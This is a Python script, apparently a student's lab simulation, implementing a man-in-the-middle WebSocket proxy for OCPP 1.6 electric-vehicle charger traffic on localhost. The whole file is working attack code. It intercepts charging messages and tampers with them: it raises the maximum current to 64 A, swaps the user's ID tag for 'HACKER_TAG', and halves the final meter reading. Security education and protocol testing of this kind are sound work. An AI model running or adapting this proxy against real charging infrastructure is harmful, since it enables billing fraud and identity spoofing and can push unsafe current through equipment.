#!/usr/bin/env python3
"""
MitM Saldırı Simülasyonu
Büşra Gül - 180541037
"""

import asyncio
import websockets
import json
from datetime import datetime
import os

LOG_FILE = "logs/mitm_logs.txt"

def log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    print(log_entry.strip())
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

def manipulate_message(message):
    try:
        data = json.loads(message)
        
        if len(data) > 2:
            action = data[2] if len(data) > 2 else None
            payload = data[3] if len(data) > 3 else {}
            
            log(f"[MitM] Intercepted: {action}")
            
            if action == "RemoteStartTransaction":
                if "charging_profile" in payload:
                    original = payload["charging_profile"].get("max_current", 32)
                    payload["charging_profile"]["max_current"] = 64
                    log(f"[MitM] Changed max_current: {original} → 64 A")
            
            elif action == "StartTransaction":
                if "id_tag" in payload:
                    original = payload["id_tag"]
                    payload["id_tag"] = "HACKER_TAG"
                    log(f"[MitM] Changed id_tag: {original} → HACKER_TAG")
            
            elif action == "StopTransaction":
                if "meter_stop" in payload:
                    original = payload["meter_stop"]
                    payload["meter_stop"] = int(original * 0.5)
                    log(f"[MitM] Changed meter: {original} → {payload['meter_stop']}")
            
            manipulated = json.dumps([data[0], data[1], action, payload])
            return manipulated
        
    except Exception as e:
        log(f"[MitM] Error: {e}")
    
    return message

async def proxy(client_ws, server_uri):
    try:
        async with websockets.connect(server_uri, subprotocols=['ocpp1.6']) as server_ws:
            log("[MitM] Proxy active: Client <-> Proxy <-> Server")
            
            async def forward_to_server():
                async for message in client_ws:
                    log("[MitM] >>> Client → Server")
                    manipulated = manipulate_message(message)
                    await server_ws.send(manipulated)
            
            async def forward_to_client():
                async for message in server_ws:
                    log("[MitM] <<< Server → Client")
                    await client_ws.send(message)
            
            await asyncio.gather(forward_to_server(), forward_to_client())
    
    except Exception as e:
        log(f"[MitM] Error: {e}")

async def server(websocket, path):
    log(f"[MitM] New connection")
    server_uri = 'ws://localhost:9000' + path
    await proxy(websocket, server_uri)

async def main():
    os.makedirs("logs", exist_ok=True)
    log("[MitM] Starting proxy on ws://localhost:8888")
    log("[MitM] Forwarding to ws://localhost:9000")
    
    srv = await websockets.serve(server, '0.0.0.0', 8888, subprotocols=['ocpp1.6'])
    log("[MitM] Proxy ready")
    await srv.wait_closed()

if __name__ == '__main__':
    asyncio.run(main())